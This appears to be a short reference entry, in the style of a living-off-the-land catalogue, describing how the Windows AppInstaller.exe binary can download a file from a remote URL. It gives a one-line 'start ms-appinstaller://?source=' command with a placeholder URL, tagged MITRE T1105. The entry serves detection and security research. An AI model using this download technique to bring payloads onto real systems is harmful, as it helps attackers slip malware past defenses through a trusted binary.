title: AppInstaller.exe
html:
AppInstaller.exe

Tool used for installation of AppX/MSIX applications on Windows 10

Download

Download file from Internet

start ms-appinstaller://?source={REMOTEURL:.exe}

AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache. — MITRE: T1105 — Privileges: User
